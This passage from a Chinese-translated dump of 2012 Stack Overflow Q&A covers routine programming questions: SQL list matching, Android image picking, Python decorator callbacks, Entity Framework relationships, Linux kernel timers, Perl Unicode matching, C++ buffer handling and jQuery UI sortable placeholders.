            INSERT INTO @ValuesList
            SELECT @ListValue       
        END

        SET @TmpString = LTRIM(RTRIM(SUBSTRING(@TmpString, @PosSeparator + 1, LEN(@TmpString) - @PosSeparator)))
    END

    RETURN
END 
```

* * *

## 回答 #1

> 赞同：3
> 
> 时间：2012-08-22T18:06:45.700

你不能。但是，您可以使类似的工作像这样：

```
select *
from mytable t join
     SplitListString(@Team, ',') s
     on t.ColumnA like '%'+s.param+'%' 
```

也就是说，将拆分列表移动到显式连接。替换为函数返回的实际列名，并使用 like 函数。

或者，如果您愿意：

```
select *
from mytable t cross join
     SplitListString(@Team, ',') s
where t.ColumnA like '%'+s.param+'%' 
```

这两个版本是等效的，应该产生相同的执行计划。

* * *

## 回答 #2

> 赞同：1
> 
> 时间：2012-08-22T18:19:48.967

更好的方法是拥有一个 TeamsTable (teamID, teamName, ...) 和 teamMembersTable (teamMemberID, teamID, teamMemberDetails, ...)。
然后你建立你的下拉列表
`SELECT ... FROM TeamsTable ...;`
和
`SELECT ... FROM teamMembersTable WHERE teamID IN (valueFromYourDropDown);`

或者您可以将您的 teamID 或 teamName（或两者）存储在您的（等效的）teamMembersTable 中

* * *

## 回答 #3

> 赞同：0
> 
> 时间：2012-08-22T18:27:43.683

如果没有大量工作，您将无法像 LIKE 一样工作。你可以做这样的事情（虽然很高兴看到你的一些实际数据，但我们可以提供更好的解决方案）：

```
SELECT *
FROM table
WHERE LEFT(field,3) IN @Parameter 
```

如果您想要更好的性能，请在您的表上创建一个代码字段并像这样更新它：

```
UPDATE table
SET codeField = LEFT(field,3) 
```

然后只需在该字段上添加一个索引并运行此查询即可获得结果：

```
SELECT *
FROM table
WHERE codeField IN @Parameter 
```

# facebook-graph-api - 无法使用 Graph API Explorer 删除操作

> ID：12078869
> 
> 赞同：1
> 
> 时间：2012-08-22T18:02:53.443
> 
> 标签：facebook-graph-api, facebook-opengraph

我有一个应用程序成功地将用户操作（例如 read.news）发布到 facebook。如果他们愿意，我正在构建一种删除这些操作的方式。尝试运行此代码时，我在控制台和 Graph API Explorer 中收到以下错误消息：

```
{
  "error": {
    "message": "Unsupported delete request.", 
    "type": "GraphMethodException", 
    "code": 100
  }
} 
```

我知道当我在一个多星期前尝试这个时，我能够删除一个动作，所以有些事情发生了变化。这个错误的原因是什么？

# android-intent - 带有 MediaStore.Images.Media.INTERNAL_CONTENT_URI 的 ACTION_PICK 允许用户选择通过 picasa 同步的图像（不是在设备上？）

> ID：12078870
> 
> 赞同：6
> 
> 时间：2012-08-22T18:03:00.620
> 
> 标签：android-intent

我正在平板电脑和手机上测试我们的应用程序，它们都运行 ICS 并使用相同的 Google 帐户。如果我在其中一张照片上拍照，它会显示在另一台设备上（通过 Picasa 同步）。奇怪的是，当我正常操作时，两个设备上都会显示照片

```
Intent intent = new Intent(Intent.ACTION_PICK, android.provider.MediaStore.Images.Media.INTERNAL_CONTENT_URI); 
```

让用户从图库中选择图像。我的 onActivityResult() 看起来像这样：

```
@Override
protected void onActivityResult(int requestCode, int resultCode, Intent data) {
    super.onActivityResult(requestCode, resultCode, data);
    if (resultCode != Activity.RESULT_OK) {
        return; // user cancelled
    }

    Uri imageUri = data.getData();
    if (imageUri == null) {
        // (code to show error message goes here)
        return;
    }

    // Get image path from media store
    String[] filePathColumn = { android.provider.MediaStore.MediaColumns.DATA };
    Cursor cursor = this.getContentResolver().query(imageUri, filePathColumn, null, null, null);

    if(cursor == null || !cursor.moveToFirst()) {
        // (code to show error message goes here)
        return;
    }

    int columnIndex = cursor.getColumnIndex(filePathColumn[0]);
    String imagePath = cursor.getString(columnIndex);
    cursor.close();

    if (imagePath == null) {
        // error happens here
    }
} 
```

一切都很好，直到 imagePath 为空。该代码适用于设备上的其他照片，但不适用于同步的照片。添加一些日志代码后，我们的一些用户在生产中似乎正在发生这种情况，尽管这种情况很少见（不到 10,000 张照片中的 1 张）。

我了解 ACTION_GET_CONTENT 具有 EXTRA_LOCAL_ONLY 标志以仅显示本地文件，但这仅适用于 API 版本 11 及更高版本。ACTION_GET_CONTENT 也有 CATEGORY_OPENABLE 只显示可以打开的数据。我的 ACTION_PICK 意图是否以某种方式（不正确？）显示实际上不是本地或可打开的照片？根据文档，使用 INTERNAL_CONTENT_URI 应该只显示内部存储的照片。

或者我的 onActivityResult() 代码有什么问题吗？我见过很多不同的变化：

*   检查以确保 data.getData().getPath() 不为空
*   使用 MediaStore.Images.Media.DATA 作为投影而不是 MediaStore.MediaColumns.DATA
*   使用 MediaStore.Images.ImageColumns.DATA 作为投影而不是 MediaStore.MediaColumns.DATA
*   使用 managedQuery() 来获取 Cursor 而不是 getContentResolver().query()
*   使用 CursorLoader 获取光标（API 11+）
*   使用 getColumnIndexOrThrow() 而不是 getColumnIndex()
*   调用 cursor.getColumnIndex(MediaStore.Images.Media.DATA) 然后调用 cursor.moveToFirst()
*   使用“userImage”作为列名（getColumnIndex() 的参数）

这些更改中的任何一个都可以解决问题吗？

* * *

## 回答 #1

> 赞同：0
> 
> 时间：2013-03-11T01:25:36.210

我在[这里描述了类似的问题](https://stackoverflow.com/questions/15284592/unable-to-select-particular-images-using-action-pick-intent)。

我通过使用 ContentResolver 直接从 Intent URI 打开 InputStream 来修复它：

```
public void onActivityResult(int requestCode, int resultCode, Intent data) {
  if(requestCode == ACTIVITYRESULT_CHOOSEPICTURE) {
    final InputStream ist = context.getContentResolver().openInputStream(intent.getData());
    final Bitmap bitmap = BitmapFactory.decodeStream(ist);
    ist.close();
  }
} 
```

# python - 如何从装饰器中获取对实例方法的引用

> ID：12078877
> 
> 赞同：3
> 
> 时间：2012-08-22T18:03:18.757
> 
> 标签：python, callback, signals, decorator

我一直在使用一个 GUI 库，它允许您使用连接函数将信号连接到信号处理程序，例如：

```
widget.connect(signal, callback) 
```

意味着`callback`只要从小部件触发信号，该函数就会运行。为了使我的代码更好，并`connect`从我的构造函数中删除一系列调用，我决定使用一个效果很好的装饰器：

```
def callback(widget, signal)
    def decorate(f):
            widget.connect(signal, f)
            return f
    return decorate

...

@callback(widget, signal)
def do_something():
    ... 
```

这非常有效，直到我需要在一个类中执行此操作 - 函数在绑定到类*之前*被修饰，这意味着给定的回调函数不会获得拥有它的类的实例，使其无用。有没有办法让它工作？

* * *

## 回答 #1

> 赞同：2
> 
> 时间：2012-08-22T18:03:18.757

一个相对简单的解决方案是可能的。我们首先使用装饰器来标记函数。构造实例时，我们搜索这些标记并注册回调。

更具体地说，标记和重新捕获模式通过使用装饰器在绑定函数之前对其进行标记，然后在构造函数中实例的绑定方法中找到它。

首先，我们使用装饰器进行标记（我们使用集合来允许在一个方法上进行多个标记）：

```
def callback(*args):
    def decorate(f):
        try:
            f._marks.add(args)
        except AttributeError:
            f._marks = {args}
        return f
    return decorate 
```

然后我们使用[检查模块](http://docs.python.org/library/inspect.html)找到标记函数的绑定版本，并将它们连接起来：

```
def connect_callbacks(obj):
    for _, f in inspect.getmembers(obj, inspect.ismethod):
        try:
            marks = f.__func__._marks
        except AttributeError:
            continue
        for widget, signal in marks:
            widget.connect(signal, f) 
```

`__func__`是原始的未绑定函数的名称。这使我们能够访问我们之前应用的标记，从而促进我们的*重新获取*。

然后我们可以简单地创建我们的类并装饰我们的函数，记住在构造函数中连接我们的回调：

```
class Test:
    def __init__(self):
        ...
        connect_callbacks(self)

    @callback(widget, signal)
    def test():
        ... 
```

这允许我们将绑定的方法与装饰器连接起来。

编辑：我在 github 上发布了一个小型库，可以为您执行此操作 - 它称为[recap](https://github.com/Lattyware/recap)。

# ios - 将视图拆分为三个部分（不是拆分视图）

> ID：12078881
> 
> 赞同：0
> 
> 时间：2012-08-22T18:03:24.503
> 
> 标签：ios, ios5

我想将视图分成三个不同的部分。每个部分我想设置不同的颜色。我已经尝试在drawrect中使用绘图方法。我已经成功了，但是应该在单击按钮时完成拆分。这是我使用的代码。

```
 -(void)drawRect:(CGRect)rect
            {
        int i=0;
        float width =rect.size.width/[elements count];
         CGRect paintRect;
         for (NSString *color in self.elements) 
        {
        paintRect = CGRectMake(rect.origin.x+(i*width), rect.origin.y, width, rect.size.height);
    i++;

    UIColor *colorr=[UIColor colorWithHexString:color];
    [colorr set]; 
    UIRectFill(paintRect);

       }

      } 
```

在此处输入代码

现在我想在按钮单击时使用此代码.....帮助...thanx高级

* * *

## 回答 #1

> 赞同：0
> 
> 时间：2012-08-22T18:07:45.127

一个更简单的方法是放置三个自定义按钮或自定义视图并在代码中排列它们。

将按钮或视图的背景颜色放入您想要的选择中。

在按钮的情况下，您附加 UIControlEventTouchUpInside 事件并捕获触摸。

在视图的情况下。您将子类化视图并覆​​盖与该视图关联的触摸事件并构建您自己的“点击”事件

这比尝试在单个视图中创建自己的触摸位置要简单得多。

另一种选择是在被触摸的像素处获取颜色。stackoverflow上有很多这样的例子。[这是一个](https://stackoverflow.com/questions/4616778/ios-detect-the-color-of-a-pixel)

希望有帮助

# android - Android 计算器：操作查询 + 删除答案输出不需要的零

> ID：12078884
> 
> 赞同：0
> 
> 时间：2012-08-22T18:03:33.797
> 
> 标签：android, integer, decimal, calculator

嗨，我正在开发一个 android 计算器应用程序，现在正在处理操作。我已经定义了以下内容：

```
ArrayList<Float> inputnum = new ArrayList<Float>(); 
float inputnum1; 
float inputnum2; 
```

然后对于操作，

```
case MULTIPLY: 
inputnum1 = inputnum.get(0); 
inputnum2 = inputnum.get(1); 
inputnum.add(inputnum1 * inputnum2);  
Display.setText(String.format("%.9f", inputnum.get(0))); 
```

类似的第一个分区。

muliply 函数和 divide 函数对整数很有效（例如 5*4 输出 20.00000000）但是，当它处理带小数位的数字时，例如 5.3 * 4，它输出为 21.12000089，这是不正确的。

问题是什么？另外，如何将输出设置为显示以删除不必要的零？例如，当 5*4 它只显示 20 而不是 20.000000 作为最终答案？当 5.3*4 = 21.12 而不是 21.12000000 作为最终答案时？

非常感谢！

* * *

## 回答 #1

> 赞同：0
> 
> 时间：2012-08-24T03:13:50.897

只需将所有相关的 float 更改为 double 即可避免出现舍入错误。

如果想通过在点后补零来表示 9 位小数，例如 7.56 变为 7.560000000，可以使用以下编码。

```
Display.setText(String.format("%.9f", inputnum.get(0))); 
```

# android - Android ListView：如何以动态方式连续添加各种iten？

> ID：12078887
> 
> 赞同：0
> 
> 时间：2012-08-22T18:03:50.073
> 
> 标签：android, listview, dynamic, row

我想要一些关于如何完成一项任务的提示。

我们得到了三个 EditText、一个按钮和一个列表视图。

这里的想法是当按下按钮时，来自三个 EditText 的文本将并排显示在列表视图中，给人的印象是我们在这里得到了一个表格。

这里的问题是我不知道该怎么做。我试图在网上搜索一些东西，但我什么也没有。

如果您能提供帮助，我将不胜感激。感谢您的关注，祝您有美好的一天。

* * *

## 回答 #1

> 赞同：0
> 
> 时间：2012-08-22T18:30:53.727

有几种方法可以实现您想要的。如果我理解正确，您有一个列表视图和一个按钮。当您单击该按钮时，您希望 3 个 editTexts 并排出现在您的列表视图中，使其看起来像一个表格。

最简单的解决方案是让您的列表项布局，在您的列表适配器中膨胀，只是一个带有 weightSum="3" 的线性布局，其中包含 3 个带有 layout_weight="1" 和 layout_width="0dp" 的编辑文本

所以你的 list_item.xml 看起来像：

```
<LinearLayout
    android:layout_width="match_parent"
    android:layout_height="wrap_content"
    android:weightSum="3">
    <EditText android:layout_width="0dp"
        android:layout_height="wrap_content"
        android:layout_weight="1" 
        android:visibility="invisible"/>
    <EditText android:layout_width="0dp"
        android:layout_height="wrap_content"
        android:layout_weight="1" 
        android:visibility="invisible"/>
    <EditText android:layout_width="0dp"
        android:layout_height="wrap_content"
        android:layout_weight="1" 
        android:visibility="invisible"/>
</LinearLayout> 
```

然后，在您的按钮的 onClick 中，遍历列表行的子项并将可见性设置为可见。

至于动态添加行，请使用 listadapter 和集合，并在您的集合获得/丢失项目时使用 notifydatasetchanged 更新列表。

# c# - 在两个项目之间共享 XML 文件？

> ID：12078888
> 
> 赞同：1
> 
> 时间：2012-08-22T18:03:51.363
> 
> 标签：c#, asp.net, .net, xml, visual-studio-2010

我环顾四周，根本找不到打开链接 XML 文件的方法。我的文件夹结构是这样的：

```
...\projects\ConfigService\
...\projects\Shared\
...\projects\WebTool\ 
```

在 Shared 文件夹中，我有一个 XML 文件，将由 WebTool 项目修改并由 ConfigService 读取（在每个文件构建和运行后多次）。为了使事情尽可能简单，我只是在每个项目的 XML 中尝试“添加为链接”，但是我如何真正获得链接对象的完整路径以便我可以打开它？我使用链接，因为在我的项目构建后文件将被更改，但我不会重建。

我找到的所有答案要么尝试将链接文件打包到项目的二进制文件中，要么说明用于添加类/代码而不仅仅是平面资源。

还是有更好的方法来做到这一点？

* * *

## 回答 #1

> 赞同：1
> 
> 时间：2012-08-22T18:38:25.340

我认为您想使用`app.config`文件来解决此问题。下面是你将如何做到的。

在 WebTool 服务和 Config 服务中，添加一个`app.config`包含以下文本的文件：

```
<configuration>
<appSettings>
    <add key="XmlFileLocation" value="c:\folder\projects\shared\myfile.xml" />
</appSettings>
</configuration> 
```

然后，您可以使用以下命令检索每个程序中的文件位置：

```
string filepath = ConfigurationManager.AppSettings["XmlFileLocation"]; 
```

不过，您必须在项目中添加对 System.Configuration 的引用。

祝你好运！

* * *

## 回答 #2

> 赞同：1
> 
> 时间：2012-08-22T19:16:55.610

最适合他的解决方案是使用该`Server.MapPath()`方法找到他的`Shared`文件夹，而不管他的网站在文件系统中的哪个位置。因为它总是`[virtual-directory]\Shared`完美的，他不需要担心配置设置。

* * *

## 回答 #3

> 赞同：0
> 
> 时间：2012-08-22T18:29:51.343

两种方法 一种取决于您将如何部署。如果他们都去同一个文件夹，奥德先生的解决方案是一个快速和简单的。如果您要部署到更复杂的文件夹结构，例如

```
MyApps
  Shared
  ConfigService
  WebTool 
```

创建一个与之镜像的文件夹结构，并将每个项目中的输出目录设置为相关目录（而不是默认的 bin\debug bin\release）。您可以使用每个工具的相对路径来获取它，例如 (..\MyXmlFile.xml)。

也就是说，我不喜欢上面的任何一个。

还有什么分享的？如果有一个 dll，那么它可能应该有一个返回文件位置或内容的方法，并让它管理该位置的位置。

PS不要忘记看到它暴露在文件系统（某处）上，您需要处理一些有意义的个人删除或修改它。

# jquery - Tablesorter 过滤器小部件、Tablesorter-filter 和分页问题

> ID：12078891
> 
> 赞同：2
> 
> 时间：2012-08-22T18:04:02.600
> 
> 标签：jquery, jquery-plugins, tablesorter

我正在尝试在表格上添加一些下拉过滤器以及分页。我正在使用 tableSorter 插件，即 tablesorter 进行排序，tablesorter-filter 或 filter 小部件进行过滤，tablesorter pager 用于分页。

当我在[过滤器小部件示例页面](http://mottie.github.com/tablesorter/docs/example-widget-filter-custom.html)中使用过滤器小部件时，它仅过滤当前页面的分页数据，然后分页不会更新。

当我从这个[jquery-tablesorter-filter 位置](https://github.com/jbritten/jquery-tablesorter-filter)使用 tablesorter-filter时，如同一链接上的示例中所述，分页工作正常，但是我无法使用下拉菜单来选择过滤选项。

有谁知道任何解决方法？（我现在需要使用这些 tablesorter 插件，所以很遗憾尝试其他插件不是我的选择..）

* * *

## 回答 #1

> 赞同：1
> 
> 时间：2012-09-27T23:01:03.543

Tablesorter 2.4 版现已上线。查看这个寻呼机插件和过滤器小部件一起工作的[演示。](http://mottie.github.com/tablesorter/docs/example-pager-filtered.html)只需确保寻呼机插件选项 removeRows 设置为 false：

```
$("table")
  .tablesorter()
  .tablesorterPager({ 
    // target the pager markup
    container: $(".pager"), 

    // remove rows from the table to speed up the sort of large tables. 
    // setting this to false, only hides the non-visible rows; 
    // needed if you plan to add/remove rows with the pager enabled. 
    removeRows: false, 
  }); 
```

# cakephp-2.0 - CakePHP 2.0 与 loginRedirect 相关的问题 - https 已移除

> ID：12078893
> 
> 赞同：1
> 
> 时间：2012-08-22T18:04:07.353
> 
> 标签：cakephp-2.0

我有以下问题。

反向代理用于与内部网络中的服务器建立安全 (https) 连接。所以地址是`https://<url>`。如果我现在在我的登录页面上`(https://<url>/users/login)`并点击“提交”，则 https 被删除（通过 loginRedirect）并且它正在尝试通过 http 连接到 url。当然，这会超时，但用户已登录。如果用户直接访问页面，则它正在工作。

一旦用户进入页面，他就可以做所有必要的事情，并且其他链接按预期显示为 https。

如何避免 loginRedirect 正在删除 https？一种解决方案是简单地使用`$this->redirect('<url>');`，`$this->redirect($this->Auth->redirect());`但如果有人未登录并尝试访问需要身份验证的页面的特定部分，我将失去对直接链接的处理。

* * *

## 回答 #1

> 赞同：1
> 
> 时间：2012-08-23T21:54:03.503

我刚刚在 CakePHP 灯塔论坛上得到了帮助，我想与您分享解决方案。这实际上很容易。在反向代理场景中，您必须编辑 bootstrap.php（在 config 文件夹中）并添加以下基本 URL：

```
define('FULL_BASE_URL','https://your base url'); 
```

# jquery - jQuery - 是否可以使用 javascript 制定 id

> ID：12078894
> 
> 赞同：-2
> 
> 时间：2012-08-22T18:04:07.203
> 
> 标签：jquery

我一直在制作淡入淡出图像幻灯片。我使用[hoverizr](http://www.iliasiovis.com/hoverizr/)来利用灰度效果。关键是，当图像在当前幻灯片上时，拇指应该是彩色图像。

根据给定的场景，我一直在尝试在每张幻灯片之后添加/删除类。我已成功在所有图像上添加了灰度类，但无法删除当前图像上的灰度。

问题是，是否可以使用 javascript 传递元素 ID，然后在 jQuery 中检索它？下面的代码示例：

```
 <script>
 function updateThumbs(element_id){
      var elem = element_id;
      $('#slide a img').addClass('greyScale')
      $('#' + elem).removeClass('greyScale');
 }
 </script>
 <div id="slide">
      <a onClick="updateThumbs('image_1');">
        <img src="..." id="image_1" class="greyScale">
      </a>
      <a onClick="updateThumbs('image_2');">
        <img src="..." id="image_2" class="greyScale">
      </a>
 </div> 
```

* * *

## 回答 #1

> 赞同：1
> 
> 时间：2012-08-22T18:27:49.733

是的，你可以在这个庄园里使用 jQuery。但是，我会连接事件`document.ready`而不是 html。您可以将点击事件放在图像上而不是锚点上。

```
$(document).ready(function() {
    $("#slide img").click(function () {
        $('#slide img').addClass('greyScale');
        $(this).removeClass('greyScale');
    });
}); 
```

完整示例位于<a href="http://jsfiddle.net/jrummell/Y27Tr/" rel="nofollow">jsFiddle

`addClass()`还要注意语句中缺少的分号。

# css - Wordpress：Square monitor 完全打乱了网站的外观

> ID：12078904
> 
> 赞同：1
> 
> 时间：2012-08-22T18:04:55.907
> 
> 标签：css, wordpress

所以我在 Wordpress 平台上为一个客户建立了一个网站，他说当他在一个旧的方形显示器上查看它时，布局都一团糟。我知道现在大多数显示器都是更宽的屏幕，你会被迫找到一个更小的方形显示器，但他希望它在每台显示器上看起来都很好，我完全理解。

我只是很难修复它，因为我正在宽屏笔记本电脑和宽屏显示器上构建它，所以当我进行更改时我无法确定它是否已修复。

所以我的问题是，如何查看我作为方形显示器所做的更改？我试过调整浏览器窗口的大小，但它没有做任何改变。它看起来不像他描述的任何东西。另外，我知道这是一个远景，但是是否有任何 WP 插件或任何可以修复它的东西？

PS我一直在使用@media 属性对style.css 文件进行更改。谢谢！

* * *

## 回答 #1

> 赞同：2
> 
> 时间：2012-08-22T19:01:16.623

过去，网站总是被开发来适应“方形”显示器的分辨率。今天，使用 800x600 或 640x480 的用户数量[可以忽略不计](http://www.w3schools.com/browsers/browsers_display.asp)，这就是为什么大多数网站会利用更大比例带来的空间优势。而且，在没有讨论过时的浏览器与他过时的硬件一起使用的可能性以及为什么人们不想在整体上迎合其中任何一个的情况下，我会坚持手头的问题。

如果没有看到该网站，我无法确定发生了什么，但我愿意猜测正在发生两件事之一：

1.  内容的组织方式导致一个领域推向另一个领域
2.  他必须使用浏览器上的水平滚动来查看整个站点。

克服这两个问题的解决方案是另一个问题，但是，为了让你们都看到同一页面，请将显示器的分辨率设置为等于他的分辨率以模拟他的视图。在我的台式机和笔记本电脑上，我都可以将其设置为 800x600，所以我愿意成为你也可以的。

# c# - 为什么 Code First 类需要导航属性？

> ID：12078906
> 
> 赞同：5
> 
> 时间：2012-08-22T18:05:11.477
> 
> 标签：c#, .net, entity-framework, ef-code-first

我有一些看起来像这样的域类，我想使用 Code First（在 EF 4.3 中）进行建模。

```
public class Foo {
    // ...
}

public class Bar {
    // ...

    public Foo Foo { get; set; }
}

public class Baz {
    // ...

    public Foo Foo { get; set; }
} 
```

不过，在我看到的每个[示例](http://msdn.microsoft.com/en-us/data/hh134698.aspx)`Foo`中，都在类中添加了外来对象引用。我的`Foo`班级可以不知道`Bar`and`Baz`班级，还是我真的需要做这样的事情？

```
public class Foo {
    // ...
    public virtual Bar { get; set; }

    public virtual Baz { get; set; }
} 
```

根据[这个答案](https://stackoverflow.com/a/5217845/546561)，类*确实*需要具有导航属性。我是 Code First 的新手，所以谁能解释为什么会这样？`Foo`有没有办法通过使用 Fluent API来避免像这样污染我的班级？

对我来说似乎很奇怪，`Foo`需要了解使用它的每个类。我的设计是否在某些方面存在根本性缺陷？

* * *

## 回答 #1

> 赞同：2
> 
> 时间：2012-08-22T19:51:10.253

您在这里的问题将是一对一关系的要求。EF 中的一对一关系通过主键映射。您选择主体实体，从属实体的 PK 必须具有 FK - 它们必须具有相同的 PK 值才能相关。原因是缺少对唯一键的支持。

一旦你接受了这个限制，你可以简单地使用你的模型并像这样映射它：

```
modelBuilder.Entity<Bar>()
            .HasRequired(b => b.Foo)
            .WithOptional();

modelBuilder.Entity<Baz>()
            .HasRequired(b => b.Foo)
            .WithOptional(); 
```

* * *

## 回答 #2

> 赞同：1
> 
> 时间：2012-08-22T18:33:24.870

另一个答案部分正确。

如果您希望 code-forst 使用表之间的关系来引导您的数据库模型*，*您必须至少在一个类中定义一个导航属性。

映射当然也可以在没有关系的情况下工作，但是您不会受到数据库/sql 级别的限制。除非您使用迁移或其他一些 sql 脚本添加它们。

尽管在您的示例中，我不太确定您要定义什么样的关系。这应该是一对一的关系吗？

在这种情况下， Foo 不需要知道引用它的任何其他类，正如您在链接问题中所回答的那样，只有*一个*类需要它。

# timer - del_timer 可以在其处理程序运行时返回吗？

> ID：12078907
> 
> 赞同：1
> 
> 时间：2012-08-22T18:05:29.637
> 
> 标签：timer, linux-kernel

我正在查看一些使用[add_timer](http://lxr.free-electrons.com/source/kernel/timer.c?v=3.4#L893)和[del_timer](http://lxr.free-electrons.com/source/kernel/timer.c?v=3.4#L945)启动和停止计时器的 Linux 内核模块代码。

有时，在调用 del_timer 之后，实现会继续删除计时器“对象”（[结构 timer_list ）。](http://lxr.free-electrons.com/source/include/linux/timer.h?v=3.4#L12)

我想知道这是否安全。请注意，这是一个单处理器实现，禁用了 SMP（这将强制使用[del_timer_sync](http://lxr.free-electrons.com/source/kernel/timer.c?v=3.4#L1043)）。

del_timer_sync 实现检查计时器是否正在任何地方处理，但 del_timer 没有。在 UP 系统上，是否可以在不知道 del_timer 的情况下处理计时器，即计时器已从挂起的计时器列表中删除并正在处理？

* * *

## 回答 #1

> 赞同：1
> 
> 时间：2012-08-22T21:13:41.500

UP 让事情变得相当简单，但我认为答案仍然是“视情况而定”。

如果您`del_timer`在进程上下文中进行操作，那么在 UP 上，我认为您可以安全地假设计时器在返回后没有在任何地方运行：计时器从待处理列表中删除并从计时器中断中运行，如果该中断开始，它将在允许进程上下文代码继续之前运行完成。

但是，如果您处于中断上下文中，那么您的中断可能已经中断了计时器中断，因此计时器可能正在运行。

# perl - Perl 字符串匹配在不应该的情况下失败

> ID：12078916
> 
> 赞同：1
> 
> 时间：2012-08-22T18:06:06.610
> 
> 标签：perl, string-comparison

我的脚本中有以下代码。

```
if($description =~ /\'/) {
    print "I am here\n";    
    $description =~ s/\'/'/g;
}
print "description = $description\n"; 
```

`"I am here\n"`当我运行这个脚本时，由于比较失败，我没有得到输出。

但是，当`$description`字符串确实包含撇号时。

`$description = "The baseball player’s spiritual redemption and recovery from drug addiction.";`

上下文：我正在解析从调用 nytimes bestsellers api 获得的字符串（以 json 格式返回），并且该字符串存储在`$description`字符串中。

* * *

## 回答 #1

> 赞同：6
> 
> 时间：2012-08-22T18:26:19.340

您的示例字符串不包含撇号。它包含一个`U+2019 RIGHT SINGLE QUOTATION MARK`.

它应该匹配`/\x{2019}/`

* * *

## 回答 #2

> 赞同：0
> 
> 时间：2012-08-22T18:11:14.477

您不需要在正则表达式中转义引号。稍微改变你的代码：

```
use strict;
use warnings;

my $description="The baseball player's spiritual redemption and recovery from drug addiction.";

if($description =~ /'/)
{
        print "I am here\n";
        $description =~ s/'/foo/g;
}

print "description = $description\n"; 
```

产生以下输出：

```
I am here
description = The baseball playerfoos spiritual redemption and recovery from drug addiction. 
```

# c++ - 将缓冲区/指针设置为空

> ID：12078917
> 
> 赞同：1
> 
> 时间：2012-08-22T18:06:09.833
> 
> 标签：c++, pointers, buffer, fread

我试图不断地从不同的文件将数据读入 unsigned char* 类型的缓冲区。但是，在读取下一个文件之前，我似乎无法将缓冲区设置为 NULL。

这里只是相关的代码：

```
#include <stdio.h>
#include <fstream>

int
 main (int argc, char** argv) { 

     FILE* dataFile = fopen("C:\\File1.txt", "rb");
     unsigned char *buffer = NULL;
     buffer = (unsigned char*)malloc(1000); 
     fread(buffer,1,1000,dataFile);
     fclose(dataFile);

     dataFile = fopen("C:\\File2.txt", "rb");
     buffer = NULL;
     fread(buffer,1,1000,dataFile);
     fclose(dataFile);

     system("pause");
     return 0; 

} 
```

我遇到的错误是在此行的第二次出现：**fread(buffer,1,1000,dataFile);**

我得到的错误是：

> 调试断言失败！表达式：（缓冲区！= NULL）

它指向 fread.c 的第 147 行，基本上是：

> ```
> /* validation */
> _VALIDATE_RETURN((buffer != NULL), EINVAL, 0);
> if (stream == NULL || num > (SIZE_MAX / elementSize))
> {
>     if (bufferSize != SIZE_MAX)
>     {
>         memset(buffer, _BUFFER_FILL_PATTERN, bufferSize);
>     }
> 
>     _VALIDATE_RETURN((stream != NULL), EINVAL, 0);
>     _VALIDATE_RETURN(num <= (SIZE_MAX / elementSize), EINVAL, 0);
> } 
> ```

我在谷歌上找到了将缓冲区指针指向 NULL 的方法，并尝试了各种建议，但似乎都没有奏效。任何人都可以澄清将其设置为 NULL 的正确方法是什么？

* * *

## 回答 #1

> 赞同：5
> 
> 时间：2012-08-22T18:09:41.063

You can't say `buffer = NULL` because `fread` wil try to dereference it. Dereferencing `NULL` is one of the things that are certainly and completely illegal in C++. In effect you're losing what you got from `malloc`. Perhaps you're looking for `memset` and trying to zero the buffer:

```
memset(buffer, 0, 1000); 
```

However, **you don't need to do** this before calling `fread`. There's simply no reason since `fread` will write the buffer anyway: it doesn't care if it's zeroed or not.

* * *

As a side note: you're writing very C-ish code in what I suspect is C++ (given your `fstream` header). There are better-suited I/O options for C++.

* * *

## 回答 #2

> 赞同：5
> 
> 时间：2012-08-22T18:11:07.177

Your `buffer` is a *pointer*.

When you do this:

```
buffer = (unsigned char*)malloc(1000); 
```

you allocate some space in memory, and assign its starting position to `buffer`. Remember, `buffer` holds the address of the beginning of the space, that's all. When you do this:

```
buffer = NULL; 
```

you have thrown away that address.

**EDIT:**

C++ style, without dynamic memory:

```
#include <fstream>    
using std:: string;
using std:: ifstream;

void readFromFile(string fname)
{
  char buffer[1000];
  ifstream fin(fname.c_str());
  fin.read(buffer, sizeof(buffer));
  // maybe do things with the data
}

int main ()
{
  readFromFile("File1.txt");
  readFromFile("File2.txt");
  return 0;
} 
```

There's no need to erase the contents of the buffer. If the cost of allocating and deallocating the buffer with each call is too much, just add `static`:

```
 static char buffer[1000]; 
```

It will be overwritten each time.

# jquery - 在 jQuery 可排序中将文本添加到占位符

> ID：12078919
> 
> 赞同：4
> 
> 时间：2012-08-22T18:06:21.720
> 
> 标签：jquery, jquery-ui

我正在尝试将文本添加到在拖动可排序项目时显示的占位符框中。jQuery 的 UI 中是否有我缺少的功能？现在我正在尝试获取`.append()`信息，但它不起作用。

这是jQuery函数：

```
//Sortable Function - Edit Wizard
$(function () {

    //add text to placeholder box
    if ($('.ui-state-highlight').is(':visible')) {
        $('.ui-state-highlight').append('<span>MOVE HERE</span>');
    };

    $(".sortable").sortable({
        placeholder: "ui-state-highlight",
        //revert: true,
        grid: [20, 20],
        handle: '.editMove',
        opacity: 0.6,
        scroll: true,
        scrollSensitivity: 80,
        zIndex: 10
    });
    $(".sortable").disableSelection();
}); 
```

## 编辑

我想需要有一些`.live()`改变功能`.append()`？

* * *

## 回答 #1

> 赞同：5
> 
> 时间：2014-12-28T02:44:03.560

您可以从 start 回调中修改占位符，如下所示：

```
$('#my-sortable').sortable({
    start: function(event, ui) {
        ui.placeholder.html('Placeholder Content!');
    }
}); 
```

* * *

## 回答 #2

> 赞同：4
> 
> 时间：2012-08-22T18:22:05.533

我认为问题在于，即使您的条件语句正在寻找 '.ui-state-highlight' 可见，这并不意味着 '$(this)' 指的是该元素，除非 jQuery 有更多内容这里没有显示。我在下面包含了一个小的 jsfiddle 来帮助解释，希望这会有所帮助！

**编辑：**我加入了一个新的小提琴，我 99% 确定这就是你要找的。

[我直接使用jQuery UI - 可排序](http://jqueryui.com/demos/sortable/#placeholder)页面中的示例设置了一个可排序列表，并查看了内置的事件。有一个名为 start 的事件在排序开始时绑定一个事件，我用它来将文本附加到 '.ui-state-highlight'

[http://jsfiddle.net/6PrvC/](http://jsfiddle.net/6PrvC/)

# javascript - 如何忽略 HTML 表单的默认值（javascript-coder.com 插件）

> ID：12078927
> 
> 赞同：0
> 
> 时间：2012-08-22T18:07:08.710
> 
> 标签：javascript, forms, validation, default

这可能是一个非常基本的问题，但我真的可以使用一些帮助。我正在使用来自 javascript-coder[dot]com 的插件，并且似乎无法弄清楚如何让脚本在验证时忽略我的默认值。这是代码

```
<form id="signupform" name="signupform" action="">
                    <fieldset>
                      <label>
                        <input type="text" name="FirstName" onBlur="if(this.value==''){this.value='Name:'}" onFocus="if(this.value=='Name:'){this.value=''}" value="Name:" />
                      </label>
                      <label>
